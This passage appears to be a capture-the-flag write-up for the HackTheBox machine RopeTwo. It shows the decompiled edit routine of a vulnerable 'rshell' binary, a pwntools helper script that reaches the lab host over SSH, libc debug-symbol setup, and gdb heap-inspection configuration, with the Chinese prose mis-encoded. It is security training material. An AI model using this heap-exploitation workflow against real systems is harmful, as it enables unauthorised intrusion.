<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">void do_edit(char *param_1)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  int strcmp_res;</span><br><span class="line">  long in_FS_OFFSET;</span><br><span class="line">  uint read_size;</span><br><span class="line">  int i;</span><br><span class="line">  void *new_buf;</span><br><span class="line">  long canary;</span><br><span class="line">  </span><br><span class="line">  canary = *(long *)(in_FS_OFFSET + 0x28);</span><br><span class="line">  i = 0;</span><br><span class="line">  <span class="keyword">do</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (1 &lt; i) &#123;</span><br><span class="line">      puts(<span class="string">&quot;rshell: No such file or directory&quot;</span>);</span><br><span class="line">LAB_001019a8:</span><br><span class="line">      <span class="keyword">if</span> (canary != *(long *)(in_FS_OFFSET + 0x28)) &#123;</span><br><span class="line">                    /* WARNING: Subroutine does not <span class="built_in">return</span> */</span><br><span class="line">        __stack_chk_fail();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    strcmp_res = strcmp(param_1,(char *)((long)i * <span class="number">0</span>xd0 + <span class="number">0</span>x104068));</span><br><span class="line">    <span class="keyword">if</span> ((strcmp_res == <span class="number">0</span>) &amp;&amp; ((&amp;item_array)[(long)i * <span class="number">0</span>x1a] != <span class="number">0</span>)) &#123;</span><br><span class="line">      read_size = 0;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;size: &quot;</span>);</span><br><span class="line">      __isoc99_scanf(&amp;<span class="string">&quot;%u&quot;</span>,&amp;read_size);</span><br><span class="line">      getchar();</span><br><span class="line">      <span class="keyword">if</span> (read_size &lt; 0x71) &#123;</span><br><span class="line">        new_buf = realloc((void *)(&amp;item_array)[(long)i * <span class="number">0</span>x1a],(ulong)read_size);</span><br><span class="line">        if (new_buf == (void *)<span class="number">0</span>x0) &#123;</span><br><span class="line">          puts(&quot;Error&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        else &#123;</span><br><span class="line">          *(void **)(&amp;item_array + (long)i * <span class="number">0</span>x1a) = new_buf;</span><br><span class="line">          printf(&quot;content: &quot;);</span><br><span class="line">          read(<span class="number">0</span>,(void *)(&amp;item_array)[(long)i * <span class="number">0</span>x1a],(ulong)read_size);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      else &#123;</span><br><span class="line">        puts(&quot;Memory Error!&quot;);</span><br><span class="line">      &#125;</span><br><span class="line">      goto LAB_001019a8;</span><br><span class="line">    &#125;</span><br><span class="line">    i = i + <span class="number">1</span>;</span><br><span class="line">  &#125; while( true );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™ä¸ªå¾ªç¯é¦–å…ˆæ£€æŸ¥iæ˜¯å¦å¤§äº1ï¼Œè¿™è¡¨ç¤ºå®ƒå·²ç»éå†äº†ä¸¤ä¸ªé…ç½®ï¼Œä½†æ²¡æœ‰æ‰¾åˆ°è¦ç¼–è¾‘çš„åŒ¹é…æ–‡ä»¶ï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå®ƒæ‰“å°ä¸€æ¡é”™è¯¯æ¶ˆæ¯å¹¶é€€å‡ºã€‚ç„¶åï¼Œå®ƒæ£€æŸ¥å½“å‰é¡¹ï¼Œçœ‹çœ‹åç§°æ˜¯å¦ä¸è¾“å…¥åŒ¹é…ï¼Œå¦‚æœåŒ¹é…ï¼Œå®ƒä¼šæç¤ºè¾“å…¥ä¸€ä¸ªæ–°çš„å¤§å°(ç¡®ä¿å°äº0x71)ï¼Œå¹¶åœ¨ç°æœ‰ç¼“å†²åŒºä¸Šä½¿ç”¨reallocã€‚ç„¶åè¯»å–å¹¶å­˜å‚¨å†…å®¹ï¼Œå¹¶å®Œæˆã€‚</p>
<h2 id="é…ç½®"><a href="#é…ç½®" class="headerlink" title="é…ç½®"></a>é…ç½®</h2><ul>
<li>åˆ©ç”¨è„šæœ¬</li>
</ul>
<p>ä¸ºäº†ä¸è¿™ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶äº¤äº’ï¼Œä½¿ç”¨ä¸€äº›å·¥å…·ã€‚é¦–å…ˆï¼Œå¯åŠ¨ä¸€ä¸ªPythonåˆ©ç”¨è„šæœ¬ã€‚é¦–å…ˆï¼Œå®ƒå°†åªæœ‰ä¸rshellä¸­çš„å„ç§å‘½ä»¤äº¤äº’çš„æ–¹æ³•(è¿™ä¸ªè„šæœ¬å‡è®¾æˆ‘çš„sshå…¬é’¥åœ¨chromeuserçš„authorized_keysæ–‡ä»¶ä¸­):</p>
<ul>
<li>exp.py</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line">import pdb</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">prompt = <span class="string">&#x27;$ &#x27;</span></span><br><span class="line"></span><br><span class="line">def <span class="built_in">ls</span>():</span><br><span class="line">    p.sendline(<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line">    res = p.recvuntil(prompt)</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> res.split(b<span class="string">&#x27;\n&#x27;</span>)[:-1]:</span><br><span class="line">        <span class="built_in">print</span>(line.decode())</span><br><span class="line"></span><br><span class="line">def add(name, size, content=<span class="string">&#x27;x&#x27;</span>):</span><br><span class="line">    p.sendline(f<span class="string">&#x27;add &#123;name&#125;&#x27;</span>)</span><br><span class="line">    res = p.recvuntil((&#x27;size: &#x27;, prompt))</span><br><span class="line">    <span class="keyword">if</span> res.endswith(prompt.encode()): </span><br><span class="line">        pdb.set_trace()</span><br><span class="line">        <span class="built_in">return</span></span><br><span class="line">    p.sendline(f<span class="string">&#x27;&#123;size&#125;&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> size &gt; 0:</span><br><span class="line">        p.recvuntil(<span class="string">&#x27;content: &#x27;</span>)</span><br><span class="line">        p.sendline(content)</span><br><span class="line">    res = p.recvuntil(prompt)</span><br><span class="line">    <span class="built_in">return</span> res </span><br><span class="line">    </span><br><span class="line">def <span class="built_in">rm</span>(name, <span class="built_in">wait</span>=True):</span><br><span class="line">    p.sendline(f<span class="string">&#x27;rm &#123;name&#125;&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">wait</span>:</span><br><span class="line">        p.recvuntil(prompt)</span><br><span class="line"></span><br><span class="line">def edit(name, size, content=<span class="string">&#x27;x&#x27;</span>):</span><br><span class="line">    p.sendline(f<span class="string">&#x27;edit &#123;name&#125;&#x27;</span>)</span><br><span class="line">    res = p.recvuntil((&#x27;size: &#x27;, prompt))</span><br><span class="line">    <span class="keyword">if</span> res == prompt: </span><br><span class="line">        pdb.set_trace()</span><br><span class="line">        <span class="built_in">return</span></span><br><span class="line">    p.sendline(f<span class="string">&#x27;&#123;size&#125;&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> size &gt; 0:</span><br><span class="line">        p.recvuntil(<span class="string">&#x27;content: &#x27;</span>)</span><br><span class="line">        p.send(content)</span><br><span class="line">    p.recvuntil(prompt)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">rshell = ELF(<span class="string">&#x27;./rshell&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6-ropetwo&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> args.REMOTE:</span><br><span class="line">    remote = ssh(host=<span class="string">&#x27;10.10.10.196&#x27;</span>, user=<span class="string">&#x27;chromeuser&#x27;</span>, keyfile=<span class="string">&#x27;/root/keys/ed25519_gen&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> args.REMOTE:</span><br><span class="line">    p = remote.run(<span class="string">&#x27;rshell&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process(<span class="string">&#x27;./rshell&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;$ &#x27;</span>)</span><br><span class="line">x=1</span><br></pre></td></tr></table></figure>

<ul>
<li>Libc</li>
</ul>
<p>ä½¿ç”¨ä¸RopeTwoç›¸åŒçš„libc</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">chromeuser@rope2:~$ ldd /usr/bin/rshell</span><br><span class="line">        linux-vdso.so.1 (0x00007ffd1df75000)</span><br><span class="line">        libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007fbe10a9c000)</span><br><span class="line">        /lib64/ld-linux-x86-64.so.2 (0x00007fbe10c96000)</span><br></pre></td></tr></table></figure>

<p>ä½¿ç”¨scpæ¥è·å–libc.so.6, (åœ¨æˆ‘çš„ä¸»æœºæŠŠå®ƒå‘½åä¸ºlibc.so.6-ropetwo)å’Œld-linux-x86-64.so.2ã€‚</p>
<p>æƒ³è¦libcçš„debugç¬¦å·ï¼Œæ‰€ä»¥ä½¿ç”¨ä¸<span class="exturl" data-url="aHR0cHM6Ly8weGRmLmdpdGxhYi5pby8yMDIwLzA2LzI3L2h0Yi1wbGF5ZXJ0d28uaHRtbCNmaXgtaGVhcGluZm8=">PlayerTwo<i class="fa fa-external-link-alt"></i></span>ç›¸åŒçš„è¿‡ç¨‹:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootğŸ’€kali)-[~/hackthebox/machine/rope2]</span><br><span class="line">â””â”€<span class="comment"># proxychains wget https://answers.launchpad.net/ubuntu/+source/glibc/2.29-0ubuntu2/+build/16599428/+files/libc6-dbg_2.29-0ubuntu2_amd64.deb</span></span><br><span class="line">[proxychains] config file found: /etc/proxychains.conf</span><br><span class="line">[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4</span><br><span class="line">[proxychains] DLL init: proxychains-ng 4.14</span><br><span class="line">--2021-02-17 15:53:59--  https://answers.launchpad.net/ubuntu/+<span class="built_in">source</span>/glibc/2.29-0ubuntu2/+build/16599428/+files/libc6-dbg_2.29-0ubuntu2_amd64.deb</span><br><span class="line">æ­£åœ¨è§£æä¸»æœº answers.launchpad.net (answers.launchpad.net)... 224.0.0.1</span><br><span class="line">æ­£åœ¨è¿æ¥ answers.launchpad.net (answers.launchpad.net)|224.0.0.1|:443... [proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  answers.launchpad.net:443  ...  OK</span><br><span class="line">å·²è¿æ¥ã€‚</span><br><span class="line">å·²å‘å‡º HTTP è¯·æ±‚ï¼Œæ­£åœ¨ç­‰å¾…å›åº”... 303 See Other</span><br><span class="line">ä½ç½®ï¼šhttps://launchpadlibrarian.net/418347029/libc6-dbg_2.29-0ubuntu2_amd64.deb [è·Ÿéšè‡³æ–°çš„ URL]</span><br><span class="line">--2021-02-17 15:54:03--  https://launchpadlibrarian.net/418347029/libc6-dbg_2.29-0ubuntu2_amd64.deb</span><br><span class="line">æ­£åœ¨è§£æä¸»æœº launchpadlibrarian.net (launchpadlibrarian.net)... 224.0.0.2</span><br><span class="line">æ­£åœ¨è¿æ¥ launchpadlibrarian.net (launchpadlibrarian.net)|224.0.0.2|:443... [proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  launchpadlibrarian.net:443  ...  OK</span><br><span class="line">å·²è¿æ¥ã€‚</span><br><span class="line">å·²å‘å‡º HTTP è¯·æ±‚ï¼Œæ­£åœ¨ç­‰å¾…å›åº”... 200 OK</span><br><span class="line">é•¿åº¦ï¼š5698988 (5.4M) [application/x-debian-package]</span><br><span class="line">æ­£åœ¨ä¿å­˜è‡³: â€œlibc6-dbg_2.29-0ubuntu2_amd64.debâ€</span><br><span class="line"></span><br><span class="line">libc6-dbg_2.29-0ubuntu2_amd64.deb  100%[===============================================================&gt;]   5.43M  1.96MB/s  ç”¨æ—¶ 2.8s    </span><br><span class="line"></span><br><span class="line">2021-02-17 15:54:09 (1.96 MB/s) - å·²ä¿å­˜ â€œlibc6-dbg_2.29-0ubuntu2_amd64.debâ€ [5698988/5698988])</span><br><span class="line">â”Œâ”€â”€(rootğŸ’€kali)-[~/hackthebox/machine/rope2]</span><br><span class="line">â””â”€<span class="comment"># dpkg --fsys-tarfile libc6-dbg_2.29-0ubuntu2_amd64.deb | tar xOf - ./usr/lib/debug/lib/x86_64-linux-gnu/libc-2.29.so &gt; libc-2.29.so</span></span><br><span class="line">â”Œâ”€â”€(rootğŸ’€kali)-[~/hackthebox/machine/rope2]</span><br><span class="line">â””â”€<span class="comment"># eu-unstrip libc.so.6-ropetwo libc-2.29.so</span></span><br><span class="line">â”€â”€(rootğŸ’€kali)-[~/hackthebox/machine/rope2]</span><br><span class="line">â””â”€<span class="comment"># mv libc-2.29.so&#123;,-debug&#125;</span></span><br></pre></td></tr></table></figure>

<p>ç°åœ¨å°†ä½¿ç”¨patchelfå‘Šè¯‰rshellä½¿ç”¨è¿™äº›:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootğŸ’€kali)-[~/hackthebox/machine/rope2]</span><br><span class="line">â””â”€<span class="comment"># patchelf --set-interpreter ./ld-linux-x86-64.so.2 ./rshell</span></span><br><span class="line">â”Œâ”€â”€(rootğŸ’€kali)-[~/hackthebox/machine/rope2]</span><br><span class="line">â””â”€<span class="comment"># patchelf --replace-needed libc.so.6 ./libc-2.29.so-debug  ./rshell</span></span><br></pre></td></tr></table></figure>

<p>æœ¬åœ°rshellæ­£åœ¨ä½¿ç”¨è¿™ä¸¤ä¸ªåº“:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootğŸ’€kali)-[~/hackthebox/machine/rope2]</span><br><span class="line">â””â”€<span class="comment"># ldd rshell</span></span><br><span class="line">        linux-vdso.so.1 (0x00007ffc0cdee000)</span><br><span class="line">        ./libc-2.29.so-debug (0x00007f0e2ec0c000)</span><br><span class="line">        ./ld-linux-x86-64.so.2 =&gt; /lib64/ld-linux-x86-64.so.2 (0x00007f0e2ee00000)</span><br></pre></td></tr></table></figure>

<ul>
<li>gdb</li>
</ul>
<p>å¯¹äºåˆå§‹ç¯å¢ƒï¼Œåœ¨ä¸»æœºä¸Šè¿è¡Œ</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> 0 &gt; /proc/sys/kernel/randomize_va_space</span><br></pre></td></tr></table></figure>

<p>æ¥è½¬å‘ASLRã€‚è¿™å°†å…è®¸åœ¨æƒ³è¦çš„åœ°æ–¹æ”¾ä¸€ä¸ªæ–­ç‚¹ï¼Œè€Œä¸å¿…æ¯æ¬¡éƒ½è°ƒæ•´ã€‚</p>
<p>ä¸ºäº†è·Ÿè¸ªå †ï¼Œä½¿ç”¨<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3Njd3VhcHR4L1B3bmdkYg==">Pwngdb<i class="fa fa-external-link-alt"></i></span>(ä¸è¦ä¸pwndbgæ··æ·†)ã€‚heapinfoå‘½ä»¤æ‰“å°å‡ºå„ç§freed binsçš„æ¼‚äº®è§†å›¾ã€‚</p>
<p>å°†æ‰€æœ‰è¿™äº›æ”¾åœ¨ä¸€èµ·ï¼Œä¸ºgdbåˆ›å»ºäº†ä»¥ä¸‹åˆå§‹åŒ–æ–‡ä»¶:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> pagination off</span><br><span class="line">b *0x0000555555555c2b</span><br><span class="line"><span class="built_in">command</span> 1</span><br><span class="line"><span class="built_in">echo</span> -----------------------------------\n</span><br><span class="line"><span class="built_in">set</span> <span class="variable">$cont1p</span> = *((long int*)<span class="number">0</span>x555555558060)</span><br><span class="line">set <span class="variable">$cont1</span> = *(char[]*)<span class="variable">$cont1p</span></span><br><span class="line">set <span class="variable">$name1</span> = *(char[]*) <span class="number">0</span>x555555558068</span><br><span class="line">printf &quot;[<span class="number">0</span>x%<span class="number">08</span>x%<span class="number">08</span>x] %-<span class="number">8</span>s: %s\n&quot;, <span class="variable">$cont1p</span> &gt;&gt; <span class="number">32</span>, <span class="variable">$cont1p</span>, <span class="variable">$name1</span>, <span class="variable">$cont1</span></span><br><span class="line">set <span class="variable">$cont2p</span> = *((long int*)<span class="number">0</span>x555555558130)</span><br><span class="line">set <span class="variable">$cont2</span> = *(char[]*)<span class="variable">$cont2p</span></span><br><span class="line">set <span class="variable">$name2</span> = *(char[]*) <span class="number">0</span>x555555558138</span><br><span class="line">printf &quot;[<span class="number">0</span>x%<span class="number">08</span>x%<span class="number">08</span>x] %-<span class="number">8</span>s: %s\n&quot;, <span class="variable">$cont2p</span> &gt;&gt; <span class="number">32</span>, <span class="variable">$cont2p</span>, <span class="variable">$name2</span>, <span class="variable">$cont2</span></span><br><span class="line">echo -----------------------------------\n</span><br><span class="line">x/<span class="number">48</span>xg <span class="number">0</span>x55555555c2f0</span><br><span class="line">echo -----------------------------------\n</span><br><span class="line">heapinfo</span><br><span class="line">continue</span><br><span class="line">end</span><br></pre></td></tr></table></figure>

<p>è¿™å°†åœ¨è¯»å–ä¸‹ä¸€ä¸ªå‘½ä»¤ä¹‹å‰ï¼Œåœ¨0xc2bå¤„è®¾ç½®ä¸€ä¸ªæ–­ç‚¹ã€‚åœ¨è¿™ä¸ªæ–­ç‚¹å¤„ï¼Œå®ƒå°†è®¡ç®—å‡ºä¸¤ä¸ªæ–‡ä»¶çš„åç§°å’Œå†…å®¹ï¼Œå¹¶æ‰“å°ç»“æœã€‚ç„¶åï¼Œå®ƒå°†ä»å †ä¸­æ‰“å°48ä¸ªå•è¯åœ¨å·¥ä½œçš„åŒºåŸŸ(ç¡®å®ä¿®æ”¹äº†è¿™ä¸ªåœ°å€ï¼Œå› ä¸ºå…³æ³¨çš„æ˜¯å †çš„ä¸åŒéƒ¨åˆ†)ã€‚æœ€åï¼Œå®ƒå°†è¿è¡Œheapinfoæ¥æ˜¾ç¤ºbinsã€‚ç„¶åå®ƒä¼šç»§ç»­ã€‚é€šè¿‡è¿™ç§æ–¹å¼ï¼Œå¯ä»¥é€æ­¥éå†Pythonè„šæœ¬å¹¶ä»é‚£é‡Œè¿è¡Œå‡½æ•°ï¼Œgdbçª—å£å°†ç»§ç»­åœ¨æ¯ä¸ªå‘½ä»¤ä¹‹åæ‰“å°çŠ¶æ€ã€‚</p>
<p>ç¡®å®åœ¨~&#x2F;.gdbinitæ–‡ä»¶ä¸­æ³¨é‡Šäº†Pedaçš„æ¥æºï¼Œå› ä¸ºæ— æ³•è®©å®ƒåœæ­¢åœ¨æ¯ä¸ªbreakä¸Šæ‰“å°ä¸Šä¸‹æ–‡ï¼Œè¿™ä¼šå°†æ­£åœ¨æ‰“å°çš„æ‰€æœ‰ä¿¡æ¯ä»å±å¹•ä¸Šåˆ é™¤ã€‚</p>
<h2 id="æ”¾åœ¨ä¸€èµ·"><a href="#æ”¾åœ¨ä¸€èµ·" class="headerlink" title="æ”¾åœ¨ä¸€èµ·"></a>æ”¾åœ¨ä¸€èµ·</h2><p>ç°åœ¨ï¼Œå¯åŠ¨Pythonè„šæœ¬ï¼ŒPythonè°ƒè¯•å™¨(pdb)è®¾ç½®ä¸ºåœæ­¢åœ¨æœ€åä¸€è¡Œï¼Œä»¥ä¾¿å¯ä»¥ç»§ç»­è¿è¡Œå‘½ä»¤:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootğŸ’€kali)-[~/hackthebox/machine/rope2]</span><br><span class="line">â””â”€<span class="comment"># python3 -mpdb -c &#x27;b 57&#x27; -c c exp.py</span></span><br><span class="line">Breakpoint 1 at /root/hackthebox/machine/rope2/exp.py:57</span><br><span class="line">[*] <span class="string">&#x27;/root/hackthebox/machine/rope2/rshell&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">[*] <span class="string">&#x27;/root/hackthebox/machine/rope2/libc.so.6-ropetwo&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./rshell&#x27;</span>: pid 4649</span><br><span class="line">&gt; /root/hackthebox/machine/rope2/exp.py(57)&lt;module&gt;()</span><br><span class="line">-&gt; x=1</span><br><span class="line">(Pdb)</span><br></pre></td></tr></table></figure>

<p>ç°åœ¨åœ¨å¦ä¸€ä¸ªé¢æ¿ä¸­ï¼Œå°†é™„åŠ gdbï¼Œç„¶åå‘Šè¯‰å®ƒç»§ç»­:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootğŸ’€kali)-[~/hackthebox/machine/rope2]</span><br><span class="line">â””â”€<span class="comment"># gdb -q -p $(pidof rshell) --command=gdb-rshell.init</span></span><br><span class="line">Attaching to process 4649</span><br><span class="line">Reading symbols from /root/hackthebox/machine/rope2/rshell...</span><br><span class="line">(No debugging symbols found <span class="keyword">in</span> /root/hackthebox/machine/rope2/rshell)</span><br><span class="line">Reading symbols from ./libc-2.29.so-debug...</span><br><span class="line">Reading symbols from ./ld-linux-x86-64.so.2...</span><br><span class="line">(No debugging symbols found <span class="keyword">in</span> ./ld-linux-x86-64.so.2)</span><br><span class="line">[----------------------------------registers-----------------------------------]</span><br><span class="line">RAX: 0xfffffffffffffe00 </span><br><span class="line">RBX: 0x0 </span><br><span class="line">RCX: 0x7ffff7eebf81 (&lt;__GI___libc_read+17&gt;:     cmp    rax,0xfffffffffffff000)</span><br><span class="line">RDX: 0xc7 </span><br><span class="line">RSI: 0x7fffffffdf40 --&gt; 0x0 </span><br><span class="line">RDI: 0x0 </span><br><span class="line">RBP: 0x7fffffffe010 --&gt; 0x555555555c30 (push   r15)</span><br><span class="line">RSP: 0x7fffffffdf28 --&gt; 0x555555555bfa (mov    DWORD PTR [rbp-0xd4],eax)</span><br><span class="line">RIP: 0x7ffff7eebf81 (&lt;__GI___libc_read+17&gt;:     cmp    rax,0xfffffffffffff000)</span><br><span class="line">R8 : 0x2 </span><br><span class="line">R9 : 0x7ffff7fcb5c0 (0x00007ffff7fcb5c0)</span><br><span class="line">R10: 0x3 </span><br><span class="line">R11: 0x246 </span><br><span class="line">R12: 0x555555555150 (xor    ebp,ebp)</span><br><span class="line">R13: 0x7fffffffe0f0 --&gt; 0x1 </span><br><span class="line">R14: 0x0 </span><br><span class="line">R15: 0x0</span><br><span class="line">EFLAGS: 0x246 (carry PARITY adjust ZERO sign <span class="built_in">trap</span> INTERRUPT direction overflow)</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">   0x7ffff7eebf7b &lt;__GI___libc_read+11&gt;:        jne    0x7ffff7eebf90 &lt;__GI___libc_read+32&gt;</span><br><span class="line">   0x7ffff7eebf7d &lt;__GI___libc_read+13&gt;:        xor    eax,eax</span><br><span class="line">   0x7ffff7eebf7f &lt;__GI___libc_read+15&gt;:        syscall </span><br><span class="line">=&gt; 0x7ffff7eebf81 &lt;__GI___libc_read+17&gt;:        cmp    rax,0xfffffffffffff000</span><br><span class="line">   0x7ffff7eebf87 &lt;__GI___libc_read+23&gt;:        ja     0x7ffff7eebfe0 &lt;__GI___libc_read+112&gt;</span><br><span class="line">   0x7ffff7eebf89 &lt;__GI___libc_read+25&gt;:        ret    </span><br><span class="line">   0x7ffff7eebf8a &lt;__GI___libc_read+26&gt;:        nop    WORD PTR [rax+rax*1+0x0]</span><br><span class="line">   0x7ffff7eebf90 &lt;__GI___libc_read+32&gt;:        push   r12</span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line">0000| 0x7fffffffdf28 --&gt; 0x555555555bfa (mov    DWORD PTR [rbp-0xd4],eax)</span><br><span class="line">0008| 0x7fffffffdf30 --&gt; 0x7ffff7ffeac0 --&gt; 0x7ffff7ffe9f0 --&gt; 0x7ffff7ffe758 --&gt; 0x7ffff7ffe730 --&gt; 0x7ffff7fd0000 (jg     0x7ffff7fd0047)</span><br><span class="line">0016| 0x7fffffffdf38 --&gt; 0x0 